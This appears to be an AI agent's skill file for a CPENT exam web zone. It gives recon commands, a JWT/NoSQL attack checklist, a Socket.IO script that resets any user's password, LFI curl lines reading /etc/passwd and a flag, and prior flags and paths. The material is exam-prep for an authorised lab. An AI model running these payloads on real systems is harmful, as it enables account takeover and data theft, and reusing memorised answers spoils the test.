# Zone 3 — Web application security

Prior range: `10.10.1.0/24` (excl `.1`, `.2`): a Next.js/Node + MongoDB +
JWT app and a PHP + Flask/Socket.IO app.
Full evidence (PRIVATE, do not share): `~/.config/opencode/skills/cpent-exam/private/CPENT_Web_Range_Report.md`.
Load with: `ctf-web`. Tools: toolkit.md §4.

## Recon

```bash
nmap -Pn -T4 --top-ports 100 <ip>       # note 80/443/5000 (Flask/Socket.IO)
curl -sk https://host/api/health         # stack/version/collection leaks
curl -sk https://host/robots.txt         # hidden paths (prior: /dev-studio/ /core/)
ffuf -u https://host/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -k
```
Enumerate API surface from the rendered JS: `curl -s … | grep -o '/api/[a-z/]*'`.

## Modern JS stack (Next.js/Node/Mongo/JWT) attack surface

Checklist in order:
1. **Register/login** → capture JWT cookie; decode payload (`role`, `is_admin`).
2. **Auth bypass attempts**: `alg:none`, empty signature, payload tamper,
   mass-assignment (`is_admin:true` in register/update), role-by-email-domain.
3. **JWT secret crack** (John HMAC-SHA256, mask-filtered wordlists). If it holds,
   the secret likely comes from ANOTHER in-scope host (report, config file, git) —
   pivot your search there instead of bigger wordlists.
4. **Upload endpoints**: multipart field name often concatenated into the
   destination path (`type=../../etc`) → arbitrary write; check filename
   extension whitelist separately.
5. **NoSQL**: `$ne/$gt` operators on search/profile (`type[$ne]=x`), verbose
   `E11000` errors leaking DB/collection/index names.
6. **Enumeration oracles**: registration "username exists", login error wording.
7. Next.js-specific: `x-middleware-subrequest` (CVE-2025-29927) if version
   unpatched; static-file traversal usually blocked by nginx — don't camp.

## Legacy PHP + chatbot (Socket.IO) pattern — full compromise chain

1. Register a low role via the PHP app (note charset rules on usernames).
2. Connect to the Socket.IO gateway with `python-socketio`; chat events mirror
   the app roles:
```python
import socketio, time
sio = socketio.Client()
sio.on('chat-message-technician', lambda d: print(d))
sio.connect('http://IP:5000')
sio.emit('chat-message-technician', {'user':'me@test.com','message':'who is supervisor'})
time.sleep(2)
```
3. **Broken access control on the bot**: it answers privileged questions (who is
   admin/supervisor) to ANY client, and implements `reset-password:<new>` using
   the CLIENT-SUPPLIED `user` field → set any account's password:
```python
sio.emit('chat-message-technician', {'user':'supervisor@corp.com','message':'reset-password:chosen123'})
```
4. Log into the web app as that user → role dashboard → read bug-reports/tickets
   for **paths, filenames, debug endpoints** (prior: `/syni_dev/debug-view.php`,
   `/opt/syni_dev/legacy_dev_keys.log`).
5. **LFI** on the leaked debug endpoint (no auth, relative traversal):
```bash
curl -s 'http://IP/syni_dev/debug-view.php?file=../../../../../../etc/passwd'
curl -s 'http://IP/syni_dev/debug-view.php?file=../../../../../../home/flag.txt'
```

## Report-grade findings (the zone usually grades these)

| Severity | Finding pattern |
|---|---|
| Critical | Unauth WebSocket/HTTP state change with client-controlled identity |
| Critical | LFI/debug endpoint without auth |
| High | Secrets in logs/bug reports; arbitrary file write via path traversal |
| Medium | Username enumeration, verbose DB errors, version disclosure |

Every finding: exact request (curl line), response evidence, fix. Remediation
wording matters in this zone as much as the answers.

## Gotchas

- Admin-gated challenges may be intentionally hard — timebox JWT secret hunting;
   answer the cheap discovery questions first, then return.
- The bot's charset rule (letters+numbers only) also constrains the password you
  set — special chars will fail silently.
- Flags in this zone can be plaintext inside files (`flag{A1EL2L8P}`) — LFI/read
  primitives are usually the endgame, not RCE.
